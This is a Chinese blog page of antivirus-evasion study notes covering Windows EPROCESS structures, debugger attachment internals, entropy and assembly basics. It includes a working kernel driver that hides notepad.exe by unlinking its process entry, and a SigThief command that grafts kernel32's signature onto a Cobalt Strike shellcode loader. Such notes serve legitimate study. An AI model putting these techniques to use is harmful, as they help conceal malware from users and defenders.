<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x06c ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x070 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x078 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x080 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x084 UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +0x088 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x090 QuotaUsage       : [3] Uint4B</span><br><span class="line">  </span><br></pre></td></tr></table></figure>



<p>知道了这个结构之后，我们通过 PsActiveProcessHead来找到链表头，这个链表比较特殊，它所指向的不是下一个EPROCESS的头部，而是+0x88处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd  PsActiveProcessHead</span><br><span class="line">8055b158  821b98b8 81c4b8f8 00000001 b2d79644</span><br><span class="line">8055b168  00000000 00040001 00000000 8055b174</span><br><span class="line">8055b178  8055b174 00000000 7c920000 00000000</span><br><span class="line">8055b188  00000000 00000000 00000000 00000000</span><br><span class="line">8055b198  8052894c 00000000 00000000 00000000</span><br><span class="line">8055b1a8  81bc77d8 81bc77d8 00000000 00000000</span><br><span class="line">8055b1b8  00000000 00000000 00000001 f8aedd50</span><br><span class="line">8055b1c8  00000000 00040001 00000000 8055b1d4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>前四个字节就是ActiveProcessLinks : _LIST_ENTRY头，所以我们要查询这个链表头对应的EPROCESS就要-0x88，比如0x174偏移处就是ImageFileName，0x88就是下一个 _LIST_ENTRY 的地址，[ 0x821b98b8 - 0x81c4b8f8 ]前一个是Flink，下一个是Blink</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS 8055b158-0x88</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x06c ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x070 CreateTime       : _LARGE_INTEGER 0x8055b13c</span><br><span class="line">   +0x078 ExitTime         : _LARGE_INTEGER 0x0</span><br><span class="line">   +0x080 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x084 UniqueProcessId  : 0x805539a0 Void</span><br><span class="line">   +0x088 ActiveProcessLinks : _LIST_ENTRY [ 0x821b98b8 - 0x81c4b8f8 ]</span><br><span class="line">   +0x090 QuotaUsage       : [3] 1</span><br><span class="line"> </span><br><span class="line">.............................................</span><br><span class="line">   +0x158 VdmObjects       : 0x00001a65 Void</span><br><span class="line">   +0x15c DeviceMap        : (null) </span><br><span class="line">   +0x160 PhysicalVadList  : _LIST_ENTRY [ 0x0 - 0x0 ]</span><br><span class="line">   +0x168 PageDirectoryPte : _HARDWARE_PTE</span><br><span class="line">   +0x168 Filler           : 0x00000010`00000727</span><br><span class="line">   +0x170 Session          : 0x00120c06 Void</span><br><span class="line">   +0x174 ImageFileName    : [16]  &quot;???&quot;</span><br><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>在32位中使用汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs: [0x124] ;</span><br><span class="line">mov eax, [eax + 0x220];</span><br><span class="line">mov pEprocess, eax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="demo（x86）"><a href="#demo（x86）" class="headerlink" title="demo（x86）"></a>demo（x86）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path);</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT driver);</span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span><br><span class="line">&#123;</span><br><span class="line">PEPROCESS pEprocess, pCurProcess;</span><br><span class="line">PCHAR ImageFileName;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs: [0x124] ;</span><br><span class="line">mov eax, [eax + 0x220];</span><br><span class="line">mov pEprocess, eax;</span><br><span class="line">&#125;</span><br><span class="line">pCurProcess = pEprocess;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">ImageFileName = (PCHAR)pCurProcess + 0x174;</span><br><span class="line">if (strcmp(ImageFileName, &quot;notepad.exe&quot;) == 0)</span><br><span class="line">&#123;</span><br><span class="line">PLIST_ENTRY preNode, curNode, nextNode;</span><br><span class="line">curNode = (PLIST_ENTRY)((ULONG)pCurProcess + 0x88);</span><br><span class="line">nextNode = curNode-&gt;Flink;</span><br><span class="line">preNode = curNode-&gt;Blink;</span><br><span class="line">preNode-&gt;Flink = curNode-&gt;Flink;</span><br><span class="line">nextNode-&gt;Blink = curNode-&gt;Blink;</span><br><span class="line">DbgPrint(&quot;断链成功!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">pCurProcess = (PEPROCESS)(*(PULONG)((ULONG)pCurProcess + 0x88) - 0x88);</span><br><span class="line">&#125; while (pEprocess != pCurProcess);</span><br><span class="line">driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT driver)</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(&quot;驱动卸载成功\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里在xp中加载驱动可以使用吾爱上面的驱动加载工具</p>
<h2 id="EPROCESS（64）"><a href="#EPROCESS（64）" class="headerlink" title="EPROCESS（64）"></a>EPROCESS（64）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x438</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x440</span> UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +<span class="number">0x448</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x458</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x460</span> Flags2           : Uint4B</span><br><span class="line">   +<span class="number">0x460</span> JobNotReallyActive : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">       ............................</span><br><span class="line">    +<span class="number">0x590</span> EtwDataSource    : Ptr64 Void</span><br><span class="line">   +<span class="number">0x598</span> PageDirectoryPte : Uint8B</span><br><span class="line">   +<span class="number">0x5a0</span> ImageFilePointer : Ptr64 _FILE_OBJECT</span><br><span class="line">   +<span class="number">0x5a8</span> ImageFileName    : [<span class="number">15</span>] UChar<span class="comment">// 模块名</span></span><br><span class="line">   +<span class="number">0x5b7</span> PriorityClass    : UChar</span><br><span class="line">   +<span class="number">0x5b8</span> SecurityPort     : Ptr64 Void</span><br><span class="line">   +<span class="number">0x5c0</span> SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">   +<span class="number">0x5c8</span> JobLinks         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x5d8</span> HighestUserAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x5e0</span> ThreadListHead   : _LIST_ENTRY</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/" data-id="cm1zwlrfs000ju0v63lwe62hd" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/调试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%B0%83%E8%AF%95/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.567Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="调试原理"><a href="#调试原理" class="headerlink" title="调试原理"></a>调试原理</h2><p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001125242282.png" alt="image-20241001125242282"></p>
<p>调试程序和被调试程序都运行在用户层，如果要进行连接，一定是走了内核，<strong>要先建立管道，而这个管道就是调试对象</strong></p>
<h3 id="调试事件的采集"><a href="#调试事件的采集" class="headerlink" title="调试事件的采集"></a>调试事件的采集</h3><p>调试器与被调试器之间建立联系的两种方式</p>
<p>&lt;1&gt; CreateProcess</p>
<p>&lt;2&gt; DebugActiveProces</p>
<h2 id="DebugActiveProces（分析采用的是x64的环境）"><a href="#DebugActiveProces（分析采用的是x64的环境）" class="headerlink" title="DebugActiveProces（分析采用的是x64的环境）"></a>DebugActiveProces（分析采用的是x64的环境）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个函数是调试通道建立的开始,他的主要功能就是</span><br><span class="line"></span><br><span class="line">创建调试对象(DEBUG_OBJECT)</span><br><span class="line">根据传入的Pid打开句柄(==权限问题==),调用__imp_DbgUiDebugActiveProcess,把DebugPort挂上去。</span><br></pre></td></tr></table></figure>

<p>在Kernel32中我们可以找到这个函数</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001122900814.png" alt="image-20241001122900814"></p>
<h2 id="DbgUiConnectToDbg"><a href="#DbgUiConnectToDbg" class="headerlink" title="DbgUiConnectToDbg"></a>DbgUiConnectToDbg</h2><p>跟进ntdll中的DbgUiConnectToDbg</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001123054099.png" alt="image-20241001123054099"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, gs:_TEB.NtTib.Self</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">cmp     [rax+(_TEB.DbgSsReserved+<span class="number">8</span>)], rcx ; 判断是否已经有调试</span><br><span class="line">jnz     <span class="type">short</span> HasDebugge</span><br></pre></td></tr></table></figure>

<p>这里一小段代码就是在判断DbgSsReserved+8里面是否存放了句柄，也就是是否已经在调试别的进程，我们可以看下windbg所看的TEB结构,这里0x16a0就是DbgSsReserved</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dt _TEB</span><br><span class="line">nt!_TEB</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x038 EnvironmentPointer : Ptr64 Void</span><br><span class="line">   +0x040 ClientId         : _CLIENT_ID</span><br><span class="line">.............................</span><br><span class="line">   +0x1698 ReservedForNtRpc : Ptr64 Void</span><br><span class="line">   +0x16a0 DbgSsReserved    : [2] Ptr64 Void</span><br><span class="line">   +0x16b0 HardErrorMode    : Uint4B</span><br><span class="line"> .....................................</span><br></pre></td></tr></table></figure>

<p>如果没有，那么就调用NtCreateDebugObject进入内核创建调试对象</p>
<p>这里有一个函数DbgUiIssueRemoteBreakin会创建一个线程</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002095233436.png" alt="image-20241002095233436"></p>
<p>在这个函数中继续向下调用了NtCreateDebugObject</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001123208311.png" alt="image-20241001123208311"></p>
<p>根据已有资料，NtCreateDebugObject的结构如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">NtCreateDebugObject (</span><br><span class="line">    OUT PHANDLE DebugObjectHandle,</span><br><span class="line">    IN ACCESS_MASK DesiredAccess,</span><br><span class="line">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">    IN ULONG Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<h3 id="NtCreateDebugObject"><a href="#NtCreateDebugObject" class="headerlink" title="NtCreateDebugObject"></a>NtCreateDebugObject</h3><p>从这里进入零环</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001123328545.png" alt="image-20241001123328545"></p>
<p>在ntosknrl里面看具体的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CreateDebugObject:      ; 调试对象类型</span><br><span class="line">mov     rdx, cs:DbgkDebugObjectType</span><br><span class="line">and     qword ptr [rsp+<span class="number">48</span>h], <span class="number">0</span></span><br><span class="line">lea     rax, [rsp+<span class="number">88</span>h+pObject]</span><br><span class="line">mov     [rsp+<span class="number">40</span>h], rax  ; pObject</span><br><span class="line">and     dword ptr [rsp+<span class="number">38</span>h], <span class="number">0</span></span><br><span class="line">and     dword ptr [rsp+<span class="number">30</span>h], <span class="number">0</span></span><br><span class="line">mov     dword ptr [rsp+<span class="number">28</span>h], <span class="number">68</span>h ; ObjectSize</span><br><span class="line">mov     r9b, r10b</span><br><span class="line">mov     cl, r10b        ; AccessMode</span><br><span class="line">call    ObCreateObjectEx ; 创建调试对象</span><br><span class="line">test    eax, eax</span><br><span class="line">js      Ret</span><br></pre></td></tr></table></figure>

<p>调试对象的结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_OBJECT</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Event thats set when the EventList is populated.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    KEVENT EventsPresent;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Mutex to protect the structure</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    FAST_MUTEX Mutex;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Queue of events waiting for debugger intervention</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    LIST_ENTRY EventList;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Flags for the object</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">&#125; DEBUG_OBJECT, *PDEBUG_OBJECT;</span><br></pre></td></tr></table></figure>

<p><strong>EventsPresent</strong>的意义是方便让调试器的调试循环捕捉,一旦在链表中有了要处理的调试事件,就会用KeSetEvent设置事件信号</p>
<p><strong>Mutex</strong>的意义便是多线程操作链表时候的同步作用</p>
<p><strong>EventList是链表头</strong>,链接DEBUG_EVENT所有事件</p>
<h2 id="与调试进程建立连接"><a href="#与调试进程建立连接" class="headerlink" title="与调试进程建立连接"></a>与调试进程建立连接</h2><p>在DebugActiveProcess中,创建完调试对象之后,则开始进行与被调试对象挂入操作。</p>
<p>调用如下函数进行挂入:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __fastcall <span class="title function_">DbgUiDebugActiveProcess</span><span class="params">(__int64 ProcessHandle)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 hProcess; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> status; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  hProcess = ProcessHandle;</span><br><span class="line">  status = NtDebugActiveProcess(ProcessHandle, NtCurrentTeb()-&gt;DbgSsReserved[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( status &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    status = DbgUiIssueRemoteBreakin(hProcess);</span><br><span class="line">    <span class="keyword">if</span> ( status &lt; <span class="number">0</span> )</span><br><span class="line">      ZwRemoveProcessDebug(hProcess, NtCurrentTeb()-&gt;DbgSsReserved[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此函数首先传入进程和调试对象的句柄进入内核，然后调用DbgUiIssueRemoteBreakin函数创建线程开始地址为DbgUiRemoteBreakin的远程线程让被调试进程断下来，如果远程线程设置失败则调用DbgUiStopDebugging停止调试。<strong>这个地方创建了远程线程是在将来反附加检测的主要检测点。</strong></p>
<p>之后我们主要把目光集中到NtDebugActiveProcess</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">NtDebugActiveProcess</span> <span class="params">(</span></span><br><span class="line"><span class="params">    IN HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">    IN HANDLE DebugObjectHandle</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002093850477.png" alt="image-20241002093850477"></p>
<h2 id="DbgkpSetProcessDebugObject"><a href="#DbgkpSetProcessDebugObject" class="headerlink" title="DbgkpSetProcessDebugObject"></a>DbgkpSetProcessDebugObject</h2><p>检查完了之后，继续向下跟，这个函数的声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">DbgkpSetProcessDebugObject</span> <span class="params">(</span></span><br><span class="line"><span class="params">    IN PEPROCESS Process,</span></span><br><span class="line"><span class="params">    IN PDEBUG_OBJECT DebugObject,</span></span><br><span class="line"><span class="params">    IN NTSTATUS MsgStatus,</span></span><br><span class="line"><span class="params">    IN PETHREAD LastThread</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure>

<p>最后将调试对象的句柄放到被调试对象的DebugPort里面</p>
<p>根据此前内容知道，当调试器附加一个进程的时候是调用DebugActiveProcess函数，该函数内部调用了DbgUiDebugActiveProcess，此函数内部会调用DbgUiIssueRemoteBreakin函数，最后内部则会通过RtlCreateUserThread在被调试进程内创建一个线程，线程的起始地址是DbgUiRemoteBreakin。</p>
<p>所以可以通过hook DbgUiRemoteBreakin来对调试进行监控，直接调用ExitProcess结束我们的程序</p>
<p>（有点乱了，几个文章查下来 (；′⌒&#96;)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/%E8%B0%83%E8%AF%95/" data-id="cm1zwlrfr000hu0v67695397w" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/熵与自签名" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E7%86%B5%E4%B8%8E%E8%87%AA%E7%AD%BE%E5%90%8D/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.566Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>面对360杀毒，我们自己写的ShellCode Loader很容易就被检测出来</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006170127619.png" alt="image-20241006170127619"></p>
<p>是因为我们用CS生成的Shellcode有问题吗，为了验证，我们把相关Shellcode删的只剩一个字节</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006170225880.png" alt="image-20241006170225880"></p>
<p>这样就没有被杀掉</p>
<p>回去设置好C2 Profile，将监听器改为https，生成新的shellcode</p>
<p>然后</p>
<p>我们用Resource Hacker给文件打上Kernel32的信息</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006173612675.png" alt="image-20241006173612675"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006172313940.png" alt="image-20241006172313940"></p>
<p>再用sigthief <a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/SigThief">secretsquirrel&#x2F;SigThief: Stealing Signatures and Making One Invalid Signature at a Time (github.com)</a>来偷kernel32的签名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sigthief.py -i <span class="string">&quot;C:\windows\system32\kernel32.dll&quot;</span> -t C:\Users\su\source\repos\ShellCode_Loader_HideApi\x64\Release\ShellCode_Loader_HideApi.exe -o signTest.exe</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006172321497.png" alt="image-20241006172321497"></p>
<p>不过这样还是没有过静态检测</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>目前可能有三种原因</p>
<p>首先就是我C2 Profile的设置还是有问题，看起来加密的流量实际上没有加密</p>
<p>还有可能是之前传恶意文件太多，360本身是存在阈值，也就是查杀力度，一段时间内检测到的一个恶意软件太多还是会让360加大查杀力度</p>
<p>最后也有可能是之前传文件的时候，没有注意关闭样本云同步，导致它联网查杀，存储了我们文件的hash值</p>
<p>至少先验证一下第三点</p>
<p>重新打开一个项目，并且给代码加一两行</p>
<p>然后把上面所有步骤都重复一遍，不过还是杀了（0.0</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006174844134.png" alt="image-20241006174844134"></p>
<p>果然shellcode至少还是应该混淆一下（0&#x3D;0</p>
<h1 id="熵"><a href="#熵" class="headerlink" title="熵"></a>熵</h1><p>entropy，这个概念最初可能是物理学上的概念，表达的是系统内在的混乱程度。熵是随机性的度量标 准，那么在计算机层面，安全产品是如何通过熵对我们文件进行查杀的呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">熵是杀毒软件中用于检测恶意代码的一种技术。它通过评估代码的随机性来确定其是否具有潜在的</span><br><span class="line">恶意性。</span><br><span class="line">代码的随机性是指其中的比特位或字节等数据是否具有均匀分布。正常代码通常具有较低的随机</span><br><span class="line">性，因为它是用特定的程序语言编写的，并且通常具有特定的语法和语义。恶意代码，例如恶意软</span><br><span class="line">件和恶意脚本，则通常具有较高的随机性，因为它们是使用随机数据生成工具或加密技术等进行生</span><br><span class="line">成的。</span><br><span class="line">因此，杀毒软件可以评估代码的随机性，以确定其是否具有恶意性。这通常是通过计算代码中每个</span><br><span class="line">数据块的熵值来完成的，并将这些值相加得到总熵值。如果总熵值超过了特定阈值，则可以认为代</span><br><span class="line">码具有恶意性。</span><br></pre></td></tr></table></figure>

<p>总的来说，shellcode作为一段“乱码”，会让代码的熵值有一个突发的上升，这会成为一些杀软（Win Defender）所关注的点</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/%E7%86%B5%E4%B8%8E%E8%87%AA%E7%AD%BE%E5%90%8D/" data-id="cm1zwlrfr000gu0v6cp7ceifz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/汇编" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E6%B1%87%E7%BC%96/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.565Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><h3 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h3><p>位，字节，字是计算机数据存储的单位，位是最小的存储单位，每一个位存储一个二进制码，一个字节8位，字通常由16，32，64位组成</p>
<h3 id="位"><a href="#位" class="headerlink" title="位"></a>位</h3><p>位是最基本的概念，在计算机中，由于只有0和1的存在，因此很多东西都要表示位二进制，英文名位bit</p>
<p>字节</p>
<h3 id="字节"><a href="#字节" class="headerlink" title="字节"></a>字节</h3><p>由八个位组成的一个单元，也就是八个bit组成一个Byte</p>
<h3 id="字"><a href="#字" class="headerlink" title="字"></a>字</h3><p>字表示计算机处理指令或数据的二进制位数，是计算机进行数据存储和数据处理的运算单位，不同位数的计算机字的大小不同</p>
<p><strong>32位计算机 ：1字&#x3D; 32位 &#x3D; 4 字节 ，64位计算机：1字 &#x3D; 64位 &#x3D; 8字节</strong></p>
<h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>通用寄存器可用于传送数据和暂存数据，也可参与算术逻辑运算，并报错运算结果，除此之外，通用寄存器还有一些特殊功能</p>
